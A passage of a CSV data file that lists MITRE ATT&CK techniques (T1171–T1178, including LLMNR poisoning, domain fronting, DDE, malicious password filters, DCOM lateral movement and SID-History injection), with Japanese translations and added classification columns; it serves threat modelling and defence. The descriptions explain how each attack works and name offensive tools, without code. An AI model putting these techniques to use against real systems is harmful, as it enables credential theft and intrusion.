Mshta)",defense-evasion;execution,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Proxy / Gateway;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec,2018-01-16T16:13:52.465Z,2025-04-25T15:15:56.566Z,,,,
T1171,,LLMNR/NBT-NS Poisoning and Relay,LLMNR/NBT-NSポイズニングおよびリレー,"Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS) Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",リンクローカルマルチキャスト名前解決（LLMNR）とNetBIOS名前サービス（NBT-NS）は、ホスト識別のための代替手段として機能するMicrosoft Windowsコンポーネントです。LLMNRはドメインネームシステム（DNS）形式に基づいており、同じローカルリンク上のホストが他のホストの名前解決を実行できるようにします。NBT-NSは、NetBIOS名によってローカルネットワーク上のシステムを識別します。 (出典: Wikipedia LLMNR) (出典: TechNet NetBIOS) 攻撃者は、要求されたホストの身元を知っているかのように振る舞い、LLMNR (UDP 5355)/NBT-NS (UDP 137) トラフィックに応答することで、被害者ネットワーク上の名前解決の権威あるソースを偽装できます。これによりサービスが汚染され、被害者は攻撃者が制御するシステムと通信するようになります。 要求されたホストが識別/認証を必要とするリソースに属する場合、ユーザー名と NTLMv2 ハッシュが敵対者が制御するシステムに送信されます。 攻撃者は、通信を監視するツールや[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)を通じて送信されたハッシュ情報を収集し、[ブルートフォース](https://attack.mitre.org/techniques/T1110)でオフライン解読を行い平文パスワードを取得できる。 システム間の認証パス上に存在するシステムへのアクセス権を攻撃者が保持している場合、または認証情報を使用した自動スキャンが攻撃者制御システムへの認証を試みる場合、NTLMv2ハッシュは傍受され、標的システムへのアクセスやコード実行を目的として中継される可能性があります。この中継ステップはポイズニングと連動して発生する可能性がありますが、独立して実行される場合もあります。（引用元: byt3bl33d3r NTLM Relaying）(引用元: Secure Ideas SMB Relay) ローカルネットワーク内のネームサービスをポイズニングするツールとして、NBNSpoof、Metasploit、[Responder](https://attack.mitre.org/software/S0174)などが存在する。(引用元: GitHub NBNSpoof) (引用元: Rapid7 LLMNR Spoofer) (引用元: GitHub Responder),credential-access,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0,2018-01-16T16:13:52.465Z,2025-04-25T15:15:08.606Z,,,,
T1172,,Domain Fronting,ドメイン・フロンティング,"Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, ""domainless"" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored). For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",ドメインフロントングは、コンテンツ配信ネットワーク（CDN）や複数ドメインをホストするその他のサービスにおけるルーティング方式を悪用し、HTTPSトラフィックまたはHTTPS経由でトンネル化されたトラフィックの実際の宛先を隠蔽する手法である。（引用元：Fifield Blocking Resistent Communication through domain fronting 2015）この手法では、TLSヘッダーのSNIフィールドとHTTPヘッダーのHostフィールドに異なるドメイン名を使用する。 両ドメインが同一CDNから提供される場合、CDNはTLSヘッダーを展開後、HTTPヘッダーで指定されたアドレスへルーティングする可能性がある。この手法の変種である「ドメインレス」フロントングでは、SNIフィールドを空白のまま使用する。これにより、CDNがSNIとHTTP Hostフィールドの一致を検証しようとする場合でも（空白のSNIフィールドが無視されれば）、フロントングが機能する可能性がある。 例えば、domain-x と domain-y が同一CDNの顧客である場合、domain-x を TLS ヘッダーに、domain-y を HTTP ヘッダーに配置することが可能です。トラフィックは domain-x 宛てに見えるものの、CDN はそれを domain-y へルーティングする可能性があります。,command-and-control,Linux;macOS;Windows,defense_disable,remote_control,network_connectivity,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--1ce03c65-5946-4ac9-9d4d-66db87e024bd,2018-01-16T16:13:52.465Z,2025-04-25T15:15:13.957Z,,,,
T1173,,Dynamic Data Exchange,動的データ交換,"Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution. Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017) Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.",Windows動的データ交換（DDE）は、アプリケーション間の単発および／または継続的なプロセス間通信（IPC）のためのクライアント・サーバープロトコルです。リンクが確立されると、アプリケーションは文字列、ウォームデータリンク（データ項目の変更時の通知）、ホットデータリンク（データ項目の変更の複製）、コマンド実行要求からなるトランザクションを自律的に交換できます。 オブジェクトのリンクと埋め込み（OLE）、すなわち文書間でのデータリンク機能は、当初DDEを通じて実装されました。COMに取って代わられたものの、DDEはWindows 10およびMicrosoft Office 2016の大部分において、レジストリキーを介して有効化される可能性があります。（引用元：BleepingComputer DDE Disabled in Word Dec 2017）（引用元： Microsoft ADV170021 2017年12月） （引用元：Microsoft DDE Advisory 2017年11月）攻撃者はDDEを利用して任意のコマンドを実行する可能性があります。Microsoft Office文書は、直接または埋め込まれたファイルを介してDDEコマンドで汚染される可能性があります （引用元：Enigma Reviving DDE Jan 2018）を介して、フィッシングキャンペーンやホストされたWebコンテンツ経由で実行を配信するために使用され、Visual Basic for Applications（VBA）マクロの使用を回避する可能性がある（引用元：SensePost MacroLess DDE Oct 2017）。DDEは、コマンドライン実行への直接アクセス権を持たない侵害されたマシン上で動作する攻撃者によっても悪用される可能性がある。,execution,Windows,script_command_execution,foothold,user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--edbe24e9-aec4-4994-ac75-6a6bc7f1ddd0,2018-01-16T16:13:52.465Z,2025-04-25T15:16:20.948Z,,,,
T1174,,Password Filter DLL,パスワードフィルターDLL,"Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. (Citation: Carnal Ownage Password Filters Sept 2013)",Windowsパスワードフィルターは、ドメインアカウントとローカルアカウントの両方に対するパスワードポリシー適用メカニズムである。フィルターはダイナミックリンクライブラリ（DLL）として実装され、パスワードポリシーに対して潜在的なパスワードを検証するメソッドを含む。フィルターDLLは、ローカルアカウント用にローカルコンピュータに、ドメインアカウント用にドメインコントローラーに配置される。セキュリティアカウントマネージャー（SAM）に新しいパスワードを登録する前に、ローカルセキュリティオーソリティ（LSA）は登録済みの各フィルターに検証を要求する。 登録済みフィルタ全てが検証を承認するまで、変更は一切有効になりません。攻撃者は悪意のあるパスワードフィルタを登録し、ローカルコンピュータやドメイン全体から認証情報を収集できます。適切な検証を行うには、フィルタはLSAから平文の認証情報を受け取る必要があります。悪意のあるパスワードフィルタは、パスワード要求が行われるたびにこの平文認証情報を受け取ることになります。（引用元: Carnal Ownage Password Filters 2013年9月）,credential-access,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;cloud_control_plane,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--b8c5c9dd-a662-479d-9428-ae745872537c,2018-01-16T16:13:52.465Z,2025-04-25T15:16:02.751Z,,,,
T1175,,Component Object Model and Distributed COM,コンポーネントオブジェクトモデルと分散COM,"**This technique has been deprecated. Please use [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Component Object Model](https://attack.mitre.org/techniques/T1559/001).** Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. COM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019) Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM. Adversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018) Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.",**この手法は非推奨です。[分散コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1021/003) および [コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001) を使用してください。** 攻撃者は、Windows コンポーネント オブジェクト モデル (COM) および分散コンポーネント オブジェクト モデル (DCOM) を、ローカルでのコード実行や、横方向の移動の一環としてリモートシステム上で実行するために利用する可能性があります。 COMはネイティブWindowsアプリケーションプログラミングインターフェース（API）の構成要素であり、ソフトウェアオブジェクト間、または1つ以上のインターフェースを実装する実行可能コード間の相互作用を可能にします。（引用元：Fireeye Hunting COM 2019年6月）COMを通じて、クライアントオブジェクトはサーバーオブジェクト（通常はダイナミックリンクライブラリ（DLL）または実行可能ファイル（EXE））のメソッドを呼び出せます。(引用元: Microsoft COM) DCOMは、リモートプロシージャコール(RPC)技術を用いて、コンポーネントオブジェクトモデル(COM)の機能をローカルコンピュータの外部へ拡張する透過的なミドルウェアである。(引用元: Microsoft COM) (引用元: Fireeye Hunting COM 2019年6月) ローカルおよびリモートサーバーのCOMオブジェクトとの相互作用に関する権限は、レジストリ内のアクセス制御リスト(ACL)によって指定される。 (引用元: Microsoft COM ACL)(引用元: Microsoft Process Wide Com Keys)(引用元: Microsoft System Wide Com Keys) デフォルトでは、管理者だけがDCOMを介してリモートでCOMオブジェクトをアクティブ化および起動できます。攻撃者は、ローカルコマンドやペイロードの実行のためにCOMを悪用する可能性があります。C、C++、Java、VBScriptなど様々なプログラミング言語を介して任意の実行を呼び出すために悪用可能な、様々なCOMインターフェースが公開されています。(引用: Microsoft COM) 特定のCOMオブジェクトは、コード実行を超えた機能を直接実行するためにも存在します。例えば、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)の作成、ファイルレスダウンロード/実行、特権昇格や永続化などの攻撃者行動が含まれます。(引用: Fireeye Hunting COM June 2019)(引用元: ProjectZero File Write EoP Apr 2018) 攻撃者は横方向移動にDCOMを利用する場合がある。DCOMを介して、適切な特権を持つユーザーのコンテキストで動作する攻撃者は、Officeアプリケーション(引用元: Enigma Outlook DCOM Lateral Movement Nov 2017)や、安全でないメソッドを含むその他のWindowsオブジェクトを通じて、任意のシェルコード実行を遠隔で取得できる。(引用: Enigma MMC20 COM 2017年1月)(引用: Enigma DCOM Lateral Movement 2017年1月) DCOMは既存文書内のマクロも実行可能 （引用元：Enigma Excel DCOM 2017年9月）さらに、Microsoft OfficeアプリケーションのCOM経由で作成されたインスタンスを介して[動的データ交換](https://attack.mitre.org/techniques/T1173)（DDE）を直接呼び出すことも可能であり（引用元：Cyberreason DCOM DDE Lateral Movement 2017年11月）、悪意のある文書を必要とせずに攻撃を実行できます。,lateral-movement;execution,Windows,script_command_execution,boundary_crossing,privileged_account;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Mail / Collaboration;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0008;TA0002,attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7,2018-01-16T16:13:52.465Z,2025-04-25T15:15:44.893Z,,,,
T1176,,Software Extensions,ソフトウェア拡張機能,"Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms.(Citation: Chrome Extension C2 Malware)(Citation: Abramovsky VSCode Security) Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the permissions and access levels of the host application. Malicious extensions can be introduced through various methods, including social engineering, compromised marketplaces, or direct installation by users or by adversaries who have already gained access to a system. Malicious extensions can be named similarly or identically to benign extensions in marketplaces. Security mechanisms in extension marketplaces may be insufficient to detect malicious components, allowing adversaries to bypass automated scanners or exploit trust established during the installation process. Adversaries may also abuse benign extensions to achieve their objectives, such as using legitimate functionality to tunnel data or bypass security controls. The modular nature of extensions and their integration with host applications make them an attractive target for adversaries seeking to exploit trusted software ecosystems. Detection can be challenging due to the inherent trust placed in extensions during installation and their ability to blend into normal application workflows.",攻撃者は、ソフトウェア拡張機能を悪用して被害者システムへの永続的なアクセスを確立する可能性があります。 ソフトウェア拡張機能は、Web ブラウザ、統合開発環境 (IDE)、その他のプラットフォームなど、ソフトウェアアプリケーションの機能を強化またはカスタマイズするモジュール式コンポーネントです（引用：Chrome Extension C2 Malware）（引用：Abramovsky VSCode Security）。拡張機能は通常、公式のマーケットプレイスやアプリストアからインストールされるか、ユーザーによって手動でロードされ、多くの場合、ホストアプリケーションの権限とアクセスレベルを継承します。 悪意のある拡張機能は、ソーシャルエンジニアリング、侵害されたマーケットプレイス、ユーザーによる直接インストール、あるいは既にシステムへのアクセス権を獲得した攻撃者によるインストールなど、様々な方法で導入される可能性があります。悪意のある拡張機能は、マーケットプレイス上で正常な拡張機能と類似または同一の名称が付けられている場合があります。拡張機能マーケットプレイスのセキュリティメカニズムは、悪意のあるコンポーネントを検出するには不十分な場合があり、攻撃者が自動スキャナーを回避したり、インストールプロセス中に確立された信頼を悪用したりすることを可能にします。 攻撃者はまた、正当な機能を利用してデータをトンネル化したりセキュリティ制御を迂回したりするなど、目的達成のために良性の拡張機能を悪用する可能性があります。拡張機能のモジュール性とホストアプリケーションとの統合性は、信頼されたソフトウェアエコシステムを悪用しようとする攻撃者にとって魅力的な標的となります。インストール時に拡張機能に内在する信頼関係や、通常のアプリケーションワークフローに溶け込む能力のため、検出は困難な場合があります。,persistence,Linux;macOS;Windows,discovery_enumeration,foothold,user_interaction;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8,2018-01-16T16:13:52.465Z,2025-04-15T19:58:22.784Z,,,,
T1176.001,T1176,Browser Extensions,ブラウザ拡張機能,"Adversaries may abuse internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality to and customize aspects of internet browsers. They can be installed directly via a local file or custom URL or through a browser's app store - an official online platform where users can browse, install, and manage extensions for a specific web browser. Extensions generally inherit the web browser's permissions previously granted.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition) Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores, so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary-controlled server or manipulate the mobile configuration file to silently install additional extensions. Previous to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles; however, <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS) Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation: Browers FriarFox)(Citation: Browser Adrozek)",攻撃者はインターネットブラウザ拡張機能を悪用し、被害者システムへの持続的なアクセスを確立する可能性があります。ブラウザ拡張機能またはプラグインは、インターネットブラウザの機能を追加・カスタマイズできる小型プログラムです。これらはローカルファイルやカスタムURL経由で直接インストールされるほか、ブラウザのアプリストア（特定のウェブブラウザ向け拡張機能を閲覧・インストール・管理できる公式オンラインプラットフォーム）を通じて導入されます。 拡張機能は通常、ウェブブラウザに事前に付与された権限を継承します。（出典: Wikipedia ブラウザ拡張機能）（出典: Chrome 拡張機能の定義）悪意のある拡張機能は、正当な拡張機能に偽装した悪意のあるアプリストアからのダウンロード、ソーシャルエンジニアリング、または既にシステムを侵害した攻撃者によってブラウザにインストールされる可能性があります。 ブラウザアプリストアのセキュリティは限定的であるため、悪意のある拡張機能が自動スキャナーを回避することは難しくない場合があります。（引用元：悪意のあるChrome拡張機能の数）ブラウザによっては、攻撃者が拡張機能の更新URLを操作して攻撃者が制御するサーバーから更新をインストールしたり、モバイル設定ファイルを操作して追加の拡張機能を静かにインストールしたりすることも可能です。 macOS 11以前では、攻撃者は<code>profiles</code>ツールを用いたコマンドライン経由で悪意のある<code>.mobileconfig</code>ファイルをインストールし、ブラウザ拡張機能を密かに導入できました。macOS 11以降では<code>profiles</code>ツールによる設定プロファイルのインストールは不可能ですが、<code>.mobileconfig</code>ファイルはユーザー操作を伴って埋め込み・インストールされる可能性があります。(引用: xorrior chrome extensions macOS) 拡張機能がインストールされると、バックグラウンドでウェブサイトを閲覧し、ユーザーがブラウザに入力するすべての情報（認証情報を含む）を窃取し、永続化のためのRATインストーラーとして使用される可能性があります。(引用: Chrome Extension Crypto Miner)(引用: ICEBRG Chrome Extensions)(引用: Banker Google Chrome Extension Steals Creds)(引用: Catch All Chrome Extension) 悪意のあるChrome拡張機能を介した持続的バックドアを[コマンドアンドコントロール](https://attack.mitre.org/tactics/TA0011)に利用するボットネット事例も確認されている。(引用: Stantinko Botnet)(引用: Chrome Extension C2 Malware) 攻撃者はまた、[防御回避](https://attack.mitre.org/tactics/TA0005)のために、ブラウザ拡張機能を利用してブラウザの権限やコンポーネント、プライバシー設定、その他のセキュリティ制御を変更する場合があります。(引用: Browers FriarFox)(引用: Browser Adrozek),persistence,Linux;Windows;macOS,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--278716b1-61ce-4a74-8d17-891d0c494101,2025-03-30T22:12:27.799Z,2025-04-15T19:58:15.232Z,,,,
T1176.002,T1176,IDE Extensions,IDE拡張機能,"Adversaries may abuse an integrated development environment (IDE) extension to establish persistent access to victim systems.(Citation: Mnemonic misuse visual studio) IDEs such as Visual Studio Code, IntelliJ IDEA, and Eclipse support extensions - software components that add features like code linting, auto-completion, task automation, or integration with tools like Git and Docker. A malicious extension can be installed through an extension marketplace (i.e., [Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001)) or side-loaded directly into the IDE.(Citation: Abramovsky VSCode Security)(Citation: Lakshmanan Visual Studio Marketplace) In addition to installing malicious extensions, adversaries may also leverage benign ones. For example, adversaries may establish persistent SSH tunnels via the use of the VSCode Remote SSH extension (i.e., [IDE Tunneling](https://attack.mitre.org/techniques/T1219/001)). Trust is typically established through the installation process; once installed, the malicious extension is run every time that the IDE is launched. The extension can then be used to execute arbitrary code, establish a backdoor, mine cryptocurrency, or exfiltrate data.(Citation: ExtensionTotal VSCode Extensions 2025)",攻撃者は統合開発環境（IDE）拡張機能を悪用し、被害システムへの持続的アクセスを確立する可能性がある。(引用: Mnemonic misuse visual studio) Visual Studio Code、IntelliJ IDEA、EclipseなどのIDEは拡張機能をサポートしている。これらはコードリンティング、自動補完、タスク自動化、GitやDockerなどのツールとの連携といった機能を追加するソフトウェアコンポーネントである。 悪意のある拡張機能は、拡張機能マーケットプレイス（例：[ソフトウェア依存関係と開発ツールの侵害](https://attack.mitre.org/techniques/T1195/001)）経由でインストールされるか、IDEに直接サイドロードされる可能性がある。（引用元： Abramovsky VSCode Security)(引用元: Lakshmanan Visual Studio Marketplace) 悪意のある拡張機能のインストールに加え、攻撃者は無害な拡張機能も悪用する可能性があります。例えば、攻撃者はVSCode Remote SSH拡張機能を利用して永続的なSSHトンネルを確立することがあります（例: [IDE Tunneling](https://attack.mitre.org/techniques/T1219/001)）。 信頼関係は通常インストールプロセスを通じて確立され、一度インストールされると、悪意のある拡張機能はIDE起動のたびに実行されます。この拡張機能は任意のコード実行、バックドアの設置、暗号通貨のマイニング、データの窃取などに悪用される可能性があります。(引用元: ExtensionTotal VSCode Extensions 2025),persistence,Linux;macOS;Windows,remote_service_abuse,foothold,endpoint_execution;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--66b34be7-6915-4b83-8d5a-b0f0592b5e41,2025-03-30T22:16:24.078Z,2025-04-23T12:40:46.664Z,,,,
T1177,,LSASS Driver,LSASSドライバー,"The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem) Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [DLL Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.",Windowsセキュリティサブシステムは、コンピューターまたはドメインのセキュリティポリシーを管理・強制する一連のコンポーネントである。ローカルセキュリティ機関（LSA）は、ローカルセキュリティポリシーとユーザー認証を担当する主要コンポーネントである。LSAには、他の様々なセキュリティ機能に関連する複数のダイナミックリンクライブラリ（DLL）が含まれており、これらはすべてLSAサブシステムサービス（LSASS）lsass.exeプロセスのコンテキストで実行される。 (引用元: Microsoft Security Subsystem) 攻撃者は、実行権限や永続化を得るために lsass.exe ドライバーを標的とする可能性があります。 不正なドライバの置換または追加（例：[DLLサイドローディング](https://attack.mitre.org/techniques/T1073) または [DLL検索順序ハイジャック](https://attack.mitre.org/techniques/T1038)）により、攻撃者は継続的なLSA操作によってトリガーされる任意のコード実行を達成できます。,execution;persistence,Windows,config_policy_manipulation,foothold,authentication_system;user_interaction;endpoint_execution;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0002;TA0003,attack-pattern--6e6845c2-347a-4a6f-a2d1-b74a18ebd352,2018-01-16T16:13:52.465Z,2025-04-25T15:15:42.032Z,,,,
T1178,,SID-History Injection,SID履歴注入,"The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens). Adversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",Windows セキュリティ識別子 (SID) は、ユーザーまたはグループ アカウントを一意に識別する値です。SID は、セキュリティ記述子とアクセストークンの両方で Windows セキュリティによって使用されます。 (引用元: Microsoft SID) アカウントはSID-History Active Directory属性(引用元: Microsoft SID-History Attribute)に追加のSIDを保持でき、これによりドメイン間の相互運用可能なアカウント移行が可能となる（例: SID-Historyの全値がアクセストークンに含まれる）。攻撃者はこのメカニズムを権限昇格に悪用する可能性がある。ドメイン管理者（または同等の権限）を持つ攻撃者は、収集したSID値や既知のSID値 （引用元：Microsoft Well Known SIDs Jun 2017）をSID-Historyに挿入し、エンタープライズ管理者などの任意のユーザー/グループのなりすましを可能にすることがあります。この操作により、ローカルリソースへの昇格アクセスや、[Remote Services](https://attack.mitre.org/techniques/T1021)、 [Windows管理共有](https://attack.mitre.org/techniques/T1077)、または[Windowsリモート管理](https://attack.mitre.org/techniques/T1028)などの横方向移動技術を通じて、通常はアクセス不可能なドメインへのアクセスを引き起こす可能性があります。,privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0004,attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d,2018-01-16T16:13:52.465Z,2025-04-25T15:15:14.342Z,,,,
